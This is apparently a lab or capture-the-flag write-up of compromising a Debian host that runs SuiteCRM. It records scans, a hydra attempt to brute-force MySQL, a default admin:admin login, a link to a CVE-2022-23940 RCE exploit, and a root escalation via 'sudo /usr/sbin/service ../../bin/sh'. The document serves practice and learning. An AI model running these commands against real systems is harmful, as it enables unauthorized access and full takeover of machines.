### Enumeration
```
IP=192.168.189.146
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p22,80,3306,33060 -A $IP
```
### Ports 
- 22
	- OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
- 80
	- http    Apache httpd 2.4.38 ((Debian))
- 3306
	- mysql   MySQL (unauthorized)
- 33060
	- mysqlx
- OS: Linux
### Foothold
- 3306
	- `hydra -C /usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt mysql://$IP`
		- `[ERROR] Host '192.168.45.195' is not allowed to connect to this MySQL server`
- 80
	- ![[Pasted image 20240704084538.png]]
	- admin:admin
		- successful
	- logged in
		- ![[Pasted image 20240704084604.png]]
		- We can upload custom modules from the admin tab
	- SuiteCRM
		- SuiteCRM 7.11.18 RCE Authenticated MSF
		- https://github.com/manuelz120/CVE-2022-23940
			- ![[Pasted image 20240704085339.png]]
			- ![[Pasted image 20240704085345.png]]
	- dirsearch -u http://$IP
		- `/cache  /config.php  /custom  /data  /download.php  /include  /install  /modules  /robots.txt  /soap  /themes  /upload  /vendor`
### PE
#### Linux
- USERNAME
	- id
		- uid=33(www-data) gid=33(www-data) groups=33(www-data)
	- sudo -l
		- (ALL) NOPASSWD: /usr/sbin/service
			- https://gtfobins.github.io/gtfobins/service/
			- sudo /usr/sbin/service ../../bin/sh
			- Rooted
	- uname -a
		- Linux crane 4.19.0-24-amd64 #1 SMP Debian 4.19.282-1 (2023-04-29) x86_64 GNU/Linux
	- getcap -r / 2>/dev/null
		- nothing
	- suid
		- find / -type f -perm -04000 -ls 2>/dev/null
			- nothing
### Credentials
- admin:admin
	- port 80
### Lessons Learned
- Google version and look for exploits